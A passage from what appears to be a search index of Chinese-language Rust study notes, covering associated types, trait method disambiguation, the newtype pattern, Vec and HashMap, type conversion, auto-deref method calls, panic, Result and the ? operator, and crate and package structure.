</ul>"},{"location":"cs/pl/rust/basic/#_40","title":"\u5173\u8054\u7c7b\u578b","text":"<p>\u5173\u8054\u7c7b\u578b\u5b9a\u4e49 trait \u5757\u4e2d\uff0c\u53ef\u4ee5\u5728\u540e\u7eed\u7684\u65b9\u6cd5\u4e2d\u4f7f\u7528\u8be5\u7c7b\u578b\u3002\u4f8b\u5982 Iterator \u7684\u5b9a\u4e49\uff1a <pre><code>pub trait Iterator {\n    type Item;\n    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt;;\n}\n</code></pre></p> <p>\u8fd9\u79cd\u5199\u6cd5\u6bd4\u4e3a Iterator \u589e\u52a0\u4e00\u4e2a\u6cdb\u578b\u66f4\u6709\u53ef\u8bfb\u6027\uff0c\u800c\u4e14\u5199\u8d77\u6765\u4e5f\u7b80\u4fbf</p>"},{"location":"cs/pl/rust/basic/#_41","title":"\u9ed8\u8ba4\u6cdb\u578b\u7c7b\u578b\u53c2\u6570","text":"<p>\u4f8b\u5982 Add \u8fd9\u4e2a trait\uff1a <pre><code>trait Add&lt;RHS=Self&gt; {\n    type Output;\n    fn add(self, rhs: RHS) -&gt; Self::Output;\n}\n</code></pre></p> <p>Add \u7684 RHS \u6cdb\u578b\u53c2\u6570\u5e26\u6709\u4e00\u4e2a\u9ed8\u8ba4\u503c Self\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728 impl \u7684\u65f6\u5019\uff0c\u5982\u679c\u4e0d\u4e3a Add \u6307\u5b9a\u7c7b\u578b\uff0c\u5219\u9ed8\u8ba4 RHS \u662f Self\uff0c\u5373\u8981\u52a0\u7684\u4e1c\u897f\u7c7b\u578b\u548c\u88ab\u52a0\u7684\u4e1c\u897f\u7c7b\u578b\u4e00\u81f4\u3002\u4f8b\u5982\uff1a <pre><code>struct Point {\n    x: i32,\n    y: i32,\n}\nimpl Add for Point { // \u9ed8\u8ba4\u5c31\u662f\u8981\u52a0 Point\n    type Output = Point;\n    fn add(self, other: Point) -&gt; Point {\n        ...\n    }\n}\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#_42","title":"\u540c\u540d\u65b9\u6cd5\u8c03\u7528","text":"<p>\u5f53\u4e00\u4e2a\u7c7b\u578b\u7684\u65b9\u6cd5\u4e0e\u5b83\u5b9e\u73b0\u7684 trait \u7684\u65b9\u6cd5\u540d\u91cd\u540d\u65f6\uff0c\u76f4\u63a5\u8c03\u7528\u4f1a\u8c03\u7528\u7c7b\u578b\u4e0a\u7684\u65b9\u6cd5\u3002\u60f3\u8981\u8c03\u7528 trait \u4e0a\u7684\u65b9\u6cd5\u65f6\u9700\u8981\u4f7f\u7528 :: \u6765\u663e\u5f0f\u8c03\u7528\uff0c\u5982\uff1a <pre><code>trait A { fn func(&amp;self); }\ntrait B { fn func(&amp;self); }\nstruct C;\n\nimpl A for C {\n    fn func(&amp;self) { println!(\"A\"); }\n}\nimpl B for C {\n    fn func(&amp;self) { println!(\"B\"); }\n}\nimpl C {\n    fn func(&amp;self) { println!(\"C\"); }\n}\n\nfn main() {\n    let c = C;\n    c.func();       // C\n    A::func(&amp;c);    // A\n    B::func(&amp;c);    // B\n    C::func(&amp;c);    // C \u4e0e\u7b2c\u4e00\u4e2a\u76f8\u540c\uff0c\u4f46\u663e\u5f0f\u8c03\u7528\n}\n</code></pre></p> <p>\u8fd9\u6837\u8c03\u7528\u7684\u4e00\u4e2a\u6761\u4ef6\u662f\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f self\uff08\u53c8\u53eb\u65b9\u6cd5\u63a5\u6536\u5668 receiver\uff09\uff0c\u4f46\u5982\u679c\u662f\u5173\u8054\u51fd\u6570\u7684\u8bdd\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e2a receiver\uff0crust \u4e5f\u5c31\u81ea\u7136\u4e0d\u77e5\u9053\u662f\u8c03\u7528\u54ea\u4e2a\u7c7b\u578b\u5b9e\u73b0\u7684\u7279\u5f81\u4e0a\u7684\u65b9\u6cd5</p> <p>\u8fd9\u65f6\u9700\u8981\u4f7f\u7528\u5b8c\u5168\u9650\u5b9a\u8bed\u6cd5\uff1a <pre><code>&lt;Type as Trait&gt;::function(receiver_if_method, next_arg, ...);\n</code></pre> \u4f8b\u5982\uff1a <pre><code>trait A { fn func(); }\nstruct B;\n\nimpl A for B {\n    fn func() { println!(\"A\"); }\n}\nimpl B {\n    fn func() { println!(\"B\"); }\n}\n\nfn main() {\n    B::func();          // B\n//  A::func();          // \u62a5\u9519\n    &lt;B as A&gt;::func();   // A\n}\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#trait-trait","title":"trait \u5b9a\u4e49\u4e2d\u7684 trait \u7ea6\u675f","text":"<p>\u5982\u679c\u5728\u5b9a\u4e49\u7279\u5f81 A \u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u7279\u5f81 B \u7684\u65b9\u6cd5\uff0c\u5219 A \u548c B \u90fd\u8981\u5b9e\u73b0\uff08\u5b9e\u73b0\u4e86\u5c31\u597d\uff0c\u5148\u540e\u65e0\u6240\u8c13\uff09\u3002\u5728\u5b9a\u4e49 A \u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u5728\u540e\u9762\u52a0\u4e0a\u7ea6\u675f B\uff1a <pre><code>trait A: B {\n    ...\n}\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#_43","title":"\u7ed5\u8fc7\u5b64\u513f\u89c4\u5219","text":"<p>\u7ed5\u8fc7\u5b64\u513f\u89c4\u5219\uff0c\u4e5f\u5c31\u662f\u5728\u5916\u90e8\u7c7b\u578b\u4e0a\u5b9e\u73b0\u5916\u90e8\u7279\u5f81\uff0c\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528 newtype \u6a21\u5f0f\uff0c\u5373\u521b\u5efa\u4e00\u4e2a\u5143\u7956\u7ed3\u6784\u4f53\u6765\u5305\u88c5\u5916\u90e8\u7c7b\u578b\uff0c\u8fd9\u6837\u5c31\u6784\u9020\u4e86\u4e00\u4e2a\u5728\u5f53\u524d\u4f5c\u7528\u57df\u5185\u7684\u65b0\u7c7b\u578b</p> <p>\u6bd4\u5982\u60f3\u8981\u4e3a <code>Vec&lt;String&gt;</code> \u5b9e\u73b0 Display trait\uff0c\u4e8c\u8005\u90fd\u5728\u6807\u51c6\u5e93\u4e2d\uff0c\u65e0\u6cd5\u76f4\u63a5\u5b9e\u73b0\u3002\u4f7f\u7528 newtype \u6a21\u5f0f\uff1a <pre><code>use std::fmt;\nstruct Wrapper(Vec&lt;String&gt;);\nimpl fmt::Display for Wrapper {\n    fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result {\n        write!(f, \"[{}]\", self.0.join(\", \"))\n    }\n}\n\nfn main() {\n    let w = Wrapper(vec![String::from(\"abc\"), String::from(\"def\")]);\n    println!(\"w = {}\", w);\n}\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#_44","title":"\u96c6\u5408\u7c7b\u578b","text":""},{"location":"cs/pl/rust/basic/#vector","title":"Vector","text":"<ul> <li>\u52a8\u6001\u6570\u7ec4\uff0c\u7c7b\u578b Vec&lt;T&gt;</li> <li>\u521b\u5efa<ul> <li>\u4f7f\u7528 Vec::new() \u521b\u5efa<ul> <li>\u5982\u679c\u9884\u5148\u77e5\u9053\u5bb9\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528 Vec::with_capacity(cap) \u521b\u5efa\uff0c\u4f1a\u63d0\u5347\u6027\u80fd</li> </ul> </li> <li>\u4f7f\u7528 vec! \u5b8f\u6765\u521b\u5efa\uff0c\u540c\u65f6\u7ed9\u4e88\u521d\u503c     <pre><code>let v = vec![1, 2, 3]; // \u81ea\u52a8\u63a8\u65ad\u7c7b\u578b\n</code></pre></li> <li>\u4f7f\u7528 Vec::from(...) \u6765\u4ece\u6570\u7ec4\u521b\u5efa</li> </ul> </li> <li>Vector \u7c7b\u578b\u5728\u79fb\u51fa\u4f5c\u7528\u57df\u540e\u4f1a\u81ea\u52a8\u5220\u9664\uff0c\u5176\u5b58\u50a8\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u5220\u9664</li> <li>\u64cd\u4f5c<ul> <li>.push(...) \u5728\u672b\u5c3e\u6dfb\u52a0\u5143\u7d20</li> <li>.pop() \u5254\u9664\u672b\u5c3e\u5143\u7d20</li> <li>.extend(...) \u6269\u5c55</li> <li>.len() \u83b7\u53d6\u957f\u5ea6</li> <li>\u53ef\u4ee5\u4f7f\u7528\u5207\u7247\u6765\u501f\u7528\u5143\u7d20\uff08\u8d8a\u754c\u4f1a panic\uff09</li> <li>.get(index) \u6765\u6839\u636e\u7d22\u5f15\u8bbf\u95ee\u5143\u7d20\uff0c\u8fd4\u56de\u7c7b\u578b\u662f Option&lt;&amp;T&gt;\uff08\u8d8a\u754c\u8fd4\u56de None\uff09</li> <li><code>for i in &amp;v</code> \u904d\u5386</li> <li>\u5229\u7528 enum \u6216\u7279\u5f81\u5bf9\u8c61\u6765\u5b58\u50a8\u4e0d\u540c\u7c7b\u578b\u7684</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#hashmap","title":"HashMap","text":"<ul> <li>\u5b58\u50a8\u952e\u503c\u5bf9\uff0c\u7c7b\u578b HashMap&lt;K, V&gt;</li> <li>\u9700\u8981\u4f7f\u7528 std::collections::HashMap \u5f15\u5165</li> <li>key \u4e00\u5b9a\u8981\u5b9e\u73b0 Hash \u548c Eq trait<ul> <li>f32 \u548c f64 \u4e0d\u53ef\u4ee5</li> </ul> </li> <li>\u521b\u5efa<ul> <li>HashMap::new()</li> <li>HashMap::with_capacity(cap)</li> <li>\u4f7f\u7528\u8fed\u4ee3\u5668\u548c collect     <pre><code>let lst = vec![(key1, value1), (key2, value2), ...];\nlet map: HashMap&lt;_, _&gt; = lst.into_iter().collect();\n</code></pre></li> </ul> </li> <li>\u64cd\u4f5c<ul> <li>.insert(key, value) \u63d2\u5165\u4e00\u4e2a\u952e\u503c\u5bf9</li> <li>.get(key) \u83b7\u53d6\u503c\uff0c\u8fd4\u56de Option&lt;V&gt; \u7c7b\u578b</li> <li>\u76f4\u63a5\u4f7f\u7528 [key] \u83b7\u53d6\u503c\uff0c\u6ca1\u6709 key \u4f1a panic</li> <li>.entry(key).or_insert(value)<ul> <li>\u5982\u679c\u5b58\u5728 key\uff0c\u5219\u8fd4\u56de key \u5bf9\u5e94\u7684\u503c</li> <li>\u5982\u679c\u4e0d\u5b58\u5728 key\uff0c\u5219\u63d2\u5165 key-value \u952e\u503c\u5bf9</li> <li>\u8fd4\u56de\u4e00\u4e2a &amp;mut V \u5f15\u7528\uff0c\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 map \u4e2d\u5185\u5bb9</li> </ul> </li> <li>.contains_key(key) \u67e5\u8be2\u662f\u5426\u5b58\u5728 key</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_45","title":"\u7c7b\u578b\u8f6c\u6362","text":"<ul> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\uff08\u65b9\u6cd5\u8c03\u7528\u9664\u5916\uff09Rust \u4e0d\u4f1a\u8fdb\u884c\u9690\u5f0f\u7684\u7c7b\u578b\u8f6c\u6362</li> <li>\u4f7f\u7528 as type \u8fdb\u884c\u663e\u5f0f\u7684\u8f6c\u6362</li> <li>\u8d85\u8fc7\u6700\u5927\u503c\u4f1a\u6ea2\u51fa\uff0c\u5982 300_i32 as i8 \u4f1a\u5f97\u5230 44\uff0c\u800c\u4e0d\u4f1a panic</li> <li>\u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u6307\u9488     <pre><code>let mut values: [i32; 2] = [1, 2];\nlet p1: *mut i32 = values.as_mut_ptr();\nlet first_address = p1 as usize; // \u5c06 p1 \u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u4e00\u4e2a\u6574\u6570\nlet second_address = first_address + 4;\nlet p2 = second_address as *mut i32; // \u8bbf\u95ee\u8be5\u5730\u5740\u6307\u5411\u7684\u4e0b\u4e00\u4e2a\u6574\u6570 p2\nunsafe {\n    *p2 += 1;\n}\nassert_eq!(values[1], 3);\n</code></pre></li> <li>TryInto \u8f6c\u6362<ul> <li>use std::convert::TryInto\uff0c\u4f46\u4e0d\u5fc5\u8981\uff0c\u5728 prelude \u4e2d</li> <li>TryInto trait \u6709 .try_into \u65b9\u6cd5\uff0c\u8fd4\u56de\u4e00\u4e2a Result\uff0c\u4f7f\u7528 .unwrap() \u63d0\u53d6     <pre><code>let a: u16 = 1500;\nlet b: u8 = b.try_into().unwrap();\n</code></pre></li> <li>\u5927\u7c7b\u578b\u8f6c\u6362\u4e3a\u5c0f\u7c7b\u578b\u4f1a\u8fd4\u56de Err(e)</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_46","title":"\u65b9\u6cd5\u8c03\u7528\u65f6\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362","text":"<p>\u4f8b\u5982\u5728\u8c03\u7528 a.func() \u65f6\uff08a \u7684\u7c7b\u578b\u4e3a T\uff09\uff0c\u7f16\u8bd1\u5668\u4f1a\u8fdb\u884c\u4ee5\u4e0b\u64cd\u4f5c</p> <ol> <li>\u5c1d\u8bd5\u503c\u65b9\u6cd5\u8c03\u7528\uff0c\u5373 T::func(a)</li> <li>\u5982\u679c\u4e0a\u4e00\u6b65\u65e0\u6cd5\u5b8c\u6210\uff0c\u5219\u5c1d\u8bd5\u5f15\u7528\u65b9\u6cd5\u8c03\u7528\uff0c\u5373<ul> <li>&lt;&amp;T&gt;::func(a)</li> <li>&lt;&amp;mut T&gt;::func(a)</li> </ul> </li> <li>\u5982\u679c\u4e0a\u4e00\u6b65\u4ecd\u7136\u65e0\u6cd5\u5b8c\u6210\uff0c\u5219\u8bd5\u7740\u89e3\u5f15\u7528 T\uff0c\u5982\u679c T \u6ee1\u8db3 Deref&lt;Target = U&gt;\uff0c\u5373 T \u53ef\u4ee5\u88ab\u89e3\u5f15\u7528\u4e3a U\uff0c\u5219\u7f16\u8bd1\u5668\u4f1a\u4f7f\u7528 U \u7c7b\u578b\u5c1d\u8bd5\u8c03\u7528\uff08\u4ece 1 \u5f00\u59cb\u540c\u6837\u7684\u6b65\u9aa4\uff09\uff0c\u79f0\u4e3a\u89e3\u5f15\u7528\u65b9\u6cd5\u8c03\u7528</li> <li>\u5982\u679c T \u4e0d\u80fd\u88ab\u89e3\u5f15\u7528\uff0c\u4e14 T \u662f\u4e00\u4e2a\u5b9a\u957f\u7c7b\u578b\uff0c\u5219\u7f16\u8bd1\u5668\u4f1a\u5c1d\u8bd5\u5c06 T \u8f6c\u4e3a\u4e0d\u5b9a\u957f\u7c7b\u578b\uff08\u4f8b\u5982 [i32; 2] \u8f6c\u4e3a [i32]\uff09</li> <li>\u5982\u679c\u4e0a\u9762\u90fd\u4e0d\u884c\uff0c\u5219\u4e0d\u80fd\u901a\u8fc7\u7f16\u8bd1</li> </ol> \u4f8b 1 <pre><code>let array: Rc&lt;Box&lt;[T; 3]&gt;&gt; = ...;\nlet a = array[0]; // \u53ef\u4ee5\u83b7\u53d6\u7b2c\u4e00\u4e2a\u5143\u7d20\n</code></pre> <p>\u4f1a\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff1a</p> <ol> <li>array[0] \u5b9e\u9645\u4e0a\u8868\u793a array.index(0)\uff08Index trait\uff09</li> <li>\u68c0\u67e5 array \u662f\u5426\u5b9e\u73b0 Index \u7279\u5f81\uff0cRc&lt;Box&lt;[T; 3]&gt;&gt; \u6ca1\u6709\u5b9e\u73b0\uff0c\u5c1d\u8bd5\u4e0d\u53ef\u53d8\u5f15\u7528\u548c\u53ef\u53d8\u5f15\u7528\uff0c\u90fd\u6ca1\u6709\u5b9e\u73b0\uff0c\u65e0\u6cd5\u8c03\u7528</li> <li>\u5c1d\u8bd5\u89e3\u5f15\u7528 array\uff0c\u53d8\u4e3a Box&lt;[T; 3]&gt; \u7c7b\u578b\uff0c\u5bf9\u5176\u8c03\u7528 .index(0)</li> <li>Box&lt;[T; 3]&gt;\u3001&amp;Box&lt;[T; 3]&gt;\u3001&amp;mut Box&lt;[T; 3]&gt; \u90fd\u6ca1\u6709\u5b9e\u73b0 Index\uff0c\u65e0\u6cd5\u8c03\u7528</li> <li>\u89e3\u5f15\u7528 Box&lt;[T; 3]&gt;\uff0c\u5f97\u5230 [T; 3]</li> <li>[T; 3] \u4e5f\u6ca1\u6709\u5b9e\u73b0 Index\uff08\u53ea\u6709\u6570\u7ec4\u5207\u7247\u624d\u53ef\u4ee5\u901a\u8fc7\u7d22\u5f15\u8bbf\u95ee\uff09\uff0c\u5f15\u7528\u3001\u89e3\u5f15\u7528\u90fd\u4e0d\u884c</li> <li>\u5c06\u5b9a\u957f [T; 3] \u8f6c\u4e3a\u4e0d\u5b9a\u957f [T]\uff0c\u4e5f\u5c31\u662f\u6570\u7ec4\u5207\u7247\uff0c\u5b83\u5b9e\u73b0\u4e86 Index\uff0c\u53ef\u4ee5\u8c03\u7528 .index(0) \u65b9\u6cd5</li> </ol> \u4f8b 2 <p>\u5df2\u77e5 clone \u65b9\u6cd5\u7684\u7b7e\u540d\u662f <code>fn clone(&amp;T) -&gt; T;</code> <pre><code>fn func&lt;T: Clone&gt;(value: &amp;T) {\n    let cloned = value.clone();\n}\n</code></pre> \u4e0a\u8ff0\u4ee3\u7801\u4e2d\u56e0\u4e3a value \u672c\u8eab\u662f &amp;T \u7c7b\u578b\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 clone \u65b9\u6cd5\u5f97\u5230\u4e00\u4e2a T \u7c7b\u578b\u7684 cloned <pre><code>fn func&lt;T&gt;(value: &amp;T) {\n    let cloned = value.clone();\n}\n</code></pre> \u4e0a\u8ff0\u4ee3\u7801\u867d\u7136\u6ca1\u6709\u4e3a T \u9650\u5236 Clone \u7279\u5f81\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\u3002\u8fd9\u65f6\u65e0\u6cd5\u76f4\u63a5\u8c03\u7528 value.clone()\uff0c\u6240\u4ee5\u4f1a\u5c1d\u8bd5\u8fdb\u884c\u5f15\u7528\u65b9\u6cd5\u8c03\u7528\uff0c\u6b64\u65f6 T \u53d8\u4e3a &amp;T\uff0c&amp;T \u5b9e\u73b0\u4e86 Clone \u7279\u5f81\uff0c\u6240\u4ee5\u53ef\u4ee5\u8c03\u7528\uff0c\u4f46\u8fd9\u65f6 clone \u7684\u7b7e\u540d\u76f8\u5f53\u4e8e <code>fn clone(&amp;&amp;T) -&gt; &amp;T</code>\uff0c\u6240\u4ee5\u6700\u540e\u5f97\u5230\u7684\u7ed3\u679c cloned \u7684\u7c7b\u578b\u4e3a &amp;T</p>"},{"location":"cs/pl/rust/basic/#_47","title":"\u8fd4\u56de\u503c\u4e0e\u9519\u8bef\u5904\u7406","text":"<p>Rust \u8ba4\u4e3a\u7684\u4e24\u79cd\u9519\u8bef\uff1a</p> <ul> <li>\u53ef\u6062\u590d\u9519\u8bef\uff0c\u53ea\u5f71\u54cd\u7528\u6237\u81ea\u8eab\u7684\u64cd\u4f5c\uff0c\u4e0d\u4f1a\u5bf9\u7cfb\u7edf\u4ea7\u751f\u5f71\u54cd</li> <li>\u4e0d\u53ef\u6062\u590d\u9519\u8bef\uff0c\u5168\u5c40\u6027\u6216\u8005\u7cfb\u7edf\u6027\u7684\u9519\u8bef\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u5f71\u54cd\u5f88\u5927</li> </ul> <p>Rust \u63a8\u8350\u53ef\u6062\u590d\u9519\u8bef\u4f7f\u7528 Result&lt;T, E&gt; \u8fd4\u56de\u503c\u7b49\u5f85\u540e\u7eed\u5904\u7406\u5f02\u5e38\uff0c\u4e0d\u53ef\u6062\u590d\u9519\u8bef\u76f4\u63a5 panic \u7ec8\u7aef\u7a0b\u5e8f</p>"},{"location":"cs/pl/rust/basic/#panic","title":"panic","text":"<ul> <li>\u53ef\u4ee5\u901a\u8fc7 panic! \u5b8f\u6765\u76f4\u63a5\u629b\u51fa\u4e00\u4e2a panic</li> <li>\u8fd0\u884c\u65f6\u5e26\u6709 RUST_BACKTRACE=1 \u73af\u5883\u53d8\u91cf\u7684\u8bdd\uff0c\u4f1a\u663e\u793a\u56de\u6eaf\u6808\uff08\u9700\u8981\u5f00\u542f debug \u6807\u5fd7\uff09</li> <li>panic \u65f6\u6709\u4e24\u79cd\u65b9\u5f0f\u6765\u7ec8\u6b62\uff1a<ul> <li>\u6808\u5c55\u5f00\uff1a\u56de\u6eaf\u6808\u4e0a\u6570\u636e\u548c\u51fd\u6570\u8c03\u7528\uff0c\u53ef\u4ee5\u63d0\u4f9b\u5145\u5206\u62a5\u9519\u4fe1\u606f\u548c\u6808\u8c03\u7528\u4fe1\u606f</li> <li>\u76f4\u63a5\u7ec8\u6b62\uff1a\u4e0d\u6e05\u7406\u6570\u636e\uff0c\u76f4\u63a5\u9000\u51fa\u7a0b\u5e8f\uff0c\u4ea4\u7ed9\u7cfb\u7edf\u6765\u6e05\u7406</li> <li>\u9ed8\u8ba4\u60c5\u51b5\u662f\u6808\u5c55\u5f00</li> <li>\u76f4\u63a5\u7ec8\u6b62\u7f16\u8bd1\u51fa\u7684\u53ef\u6267\u884c\u6587\u4ef6\u66f4\u5c0f\uff0c\u53ef\u4ee5\u5728 release \u65f6\u6307\u5b9a\u4f7f\u7528\u76f4\u63a5\u7ec8\u6b62\uff1a     <pre><code>[profile.release]\npanic = 'abort'\n</code></pre></li> </ul> </li> <li>\u5982\u679c\u662f main \u7ebf\u7a0b panic \u4e86\uff0c\u5219\u7a0b\u5e8f\u7ec8\u6b62\u3002\u5982\u679c\u5b50\u7ebf\u7a0b panic \u4e86\uff0c\u5219\u7ebf\u7a0b\u7ec8\u6b62\uff0cmain \u7ebf\u7a0b\u4ecd\u7136\u8fd0\u884c\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u7ed3\u675f</li> </ul>"},{"location":"cs/pl/rust/basic/#result","title":"Result","text":"<p>Result \u662f\u4e00\u4e2a\u679a\u4e3e\u7c7b\u578b\uff0c\u5b9a\u4e49\u4e3a\uff1a <pre><code>enum Result&lt;T, E&gt; {\n    Ok(T),\n    Err(E),\n}\n</code></pre></p> <ul> <li>\u4f7f\u7528 match \u6765\u5904\u7406 Result \u7c7b\u578b<ul> <li>\u4f8b\u5982 IO \u9519\u8bef\uff0c\u53ef\u4ee5\u5bf9\u4e8e Err(error) \u518d\u5339\u914d error.kind()\uff0c\u5176\u53ef\u80fd\u7684\u503c\u5728 std::io::ErrorKind \u4e2d</li> <li>\u53ef\u4ee5\u914d\u5408 panic\uff0c\u5c06 error \u7528 debug \u6a21\u5f0f\uff08{:?}\uff09\u8fdb\u884c\u8f93\u51fa</li> </ul> </li> <li>\u5bf9\u4e8e Result\uff0c\u5982\u679c\u5931\u8d25\u5c31 panic<ul> <li>\u4f7f\u7528 .unwrap()\uff1a\u5982\u679c\u662f Err \u5219\u4f1a panic\uff0c\u5e76\u8f93\u51fa\u9519\u8bef\u5185\u5bb9</li> <li>\u4f7f\u7528 .expect(\"...\")\uff1a\u540c\u6837 panic\uff0c\u4f46\u4f1a\u663e\u793a\u4e3a panicked at '...: Err \u5185\u5bb9'</li> </ul> </li> <li><code>?</code> \u4f20\u64ad\u9519\u8bef<ul> <li>\u5728\u51fd\u6570\u4e2d\u5224\u65ad Result\uff0c\u5e76\u4f20\u9012\u8fd4\u56de Err \u53ef\u4ee5\u5199\u4e3a     <pre><code>fn func() -&gt; Result&lt;String, io::Error&gt; {\n    let f = File::open(\"test.txt\");\n    let mut f = match f {\n        Ok(file) =&gt; file,\n        Err(e) =&gt; return Err(e),\n    };\n    let mut s = String::new();\n    match f.read_to_string(&amp;mut s) {\n        Ok(_) =&gt; Ok(s),\n        Err(e) =&gt; Err(e),\n    }\n}\n</code></pre></li> <li>\u5176\u4e2d match-return Err \u90e8\u5206\u53ef\u4ee5\u5229\u7528 ? \u6765\u7b80\u5199\uff1a     <pre><code>let mut f = File.open(\"test.txt\")?;\n</code></pre></li> <li>? \u5728\u8fd4\u56de Err \u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8f6c\u6362\u9519\u8bef\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a     <pre><code>fn func() -&gt; Result&lt;File, Box&lt;dyn std::error::Error&gt;&gt; {\n    let mut f = File::open(\"test.txt\")?;\n    Ok(f)\n}\n</code></pre><ul> <li>\u5728 ? \u5904\u7406\u8fd4\u56de\u9519\u8bef\u7684\u65f6\u5019\uff0c\u5f97\u5230\u7684\u662f std::io::Error \u7c7b\u578b\uff0c? \u53ef\u4ee5\u81ea\u52a8\u8c03\u7528 From trait \u7684 from \u65b9\u6cd5\uff0c\u5c06 std::io::Error \u8f6c\u4e3a\u9700\u8981\u7684 Box&lt;dyn std::error::Error&gt;</li> </ul> </li> <li>? \u53ef\u4ee5\u8fdb\u884c\u94fe\u5f0f\u8c03\u7528\uff1a     <pre><code>fn func() -&gt; Result&lt;String, std::io::Error&gt; {\n    let mut s = String::new();\n    File::open(\"test.txt\")?.read_to_string(&amp;mut s)?;\n    Ok(s)\n}\n</code></pre><ul> <li>\u5bf9\u4e8e\u8fd9\u4e2a\u64cd\u4f5c\uff0cRust \u6807\u51c6\u5e93\u63d0\u4f9b\u4e86 std::fs::read_to_string(filename) \u51fd\u6570\uff0c\u800c\u4e14\u8fd4\u56de\u7684\u5c31\u662f Result&lt;String, std::io::Error&gt;</li> </ul> </li> </ul> </li> <li>? \u7ed3\u5408 Option<ul> <li>\u548c Result \u540c\u7406\uff0c? \u4e5f\u9002\u7528\u4e8e Option \u7684\u8fd4\u56de\uff0c\u4e5f\u5c31\u662f\u5f97\u5230 None \u5c31\u7acb\u5373\u8fd4\u56de None\uff0c\u5426\u5219\u5c55\u5f00\u51fa Some \u4e2d\u7684\u503c</li> </ul> </li> <li>main \u51fd\u6570\u8fd4\u56de\u503c<ul> <li>main \u51fd\u6570\u53ef\u4ee5\u6709\u8fd4\u56de\u503c\u7c7b\u578b Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt;</li> <li>\u53ea\u6709\u58f0\u660e\u4e86\u8fd9\u79cd\u8fd4\u56de\u503c\u7684 main \u51fd\u6570\u4e2d\u624d\u53ef\u4ee5\u4f7f\u7528 ? \u6765\u63d0\u524d\u63a2\u6d4b\u9519\u8bef\u7ec8\u6b62 main \u51fd\u6570\uff1a     <pre><code>use std::error::Error;\nuse std::fs::File;\nfn main() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {\n    let f = File::open(\"test.txt\")?;\n    Ok(())\n}\n</code></pre></li> </ul> </li> <li>try! \u5b8f<ul> <li>? \u7684\u65e9\u671f\u7248\u672c\uff0c\u907f\u514d\u4f7f\u7528</li> <li>\u5b9a\u4e49\uff1a     <pre><code>macro_rules! try {\n    ($e:expr) =&gt; (match $e {\n        Ok(val) =&gt; val,\n        Err(err) =&gt; return Err(::std::convert::From::from(err)),\n    });\n}\n</code></pre></li> <li>\u4f7f\u7528\u65b9\u6cd5\uff0c\u4ee5\u4e0b\u4e24\u884c\u7b49\u4ef7\uff1a     <pre><code>let x = func()?;\nlet x = try!(func());\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_48","title":"\u5305\u548c\u6a21\u5757","text":""},{"location":"cs/pl/rust/basic/#crate-package","title":"crate \u4e0e package","text":"<ul> <li>crate \u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u53ef\u7f16\u8bd1\u5355\u5143\uff0c\u53ef\u4ee5\u7f16\u8bd1\u51fa\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u4e00\u4e2a\u5e93</li> <li>package \u662f cargo \u521b\u5efa\u7684\u5305\u542b Cargo.toml \u7684\u201c\u9879\u76ee\u201d\uff0c\u53ef\u4ee5\u5305\u542b\u56e0\u4e3a\u529f\u80fd\u6027\u88ab\u7ec4\u7ec7\u5728\u4e00\u8d77\u7684\u4e00\u4e2a crate \u6216\u591a\u4e2a crate<ul> <li>\u4e00\u4e2a package \u53ea\u80fd\u5305\u542b\u4e00\u4e2a\u5e93\uff08library\uff09\u7c7b\u578b\u7684 crate\uff0c\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u4e8c\u8fdb\u5236\u7c7b\u578b\u7684 crate</li> <li>cargo new \u9ed8\u8ba4\u521b\u5efa\u7684\u5c31\u662f\u4e8c\u8fdb\u5236 package<ul> <li>src/main.rs \u662f\u4e8c\u8fdb\u5236 crate \u7684\u6839\u6587\u4ef6\uff0c\u5176\u5305\u540d\u548c\u6240\u5c5e package \u76f8\u540c\uff0c\u5165\u53e3\u70b9\u5728 main \u51fd\u6570</li> </ul> </li> <li>cargo new &lt;name&gt; --lib \u521b\u5efa\u5e93 package<ul> <li>\u5e93 package \u53ea\u80fd\u4f5c\u4e3a\u7b2c\u4e09\u65b9\u5e93\u88ab\u5f15\u7528\uff0c\u4e0d\u80fd\u4f7f\u7528 cargo run \u8fd0\u884c</li> <li>src/lib.rs \u662f\u5e93\u7c7b\u578b\u540c\u540d crate \u7684\u6839\u6587\u4ef6</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#package","title":"\u5178\u578b package \u7ed3\u6784","text":"<pre><code>.\n\u251c\u2500\u2500 Cargo.toml\n\u251c\u2500\u2500 Cargo.lock\n\u251c\u2500\u2500 src\n\u2502   \u251c\u2500\u2500 main.rs    // \u9ed8\u8ba4\u4e8c\u8fdb\u5236 crate\uff08\u7f16\u8bd1\u751f\u6210 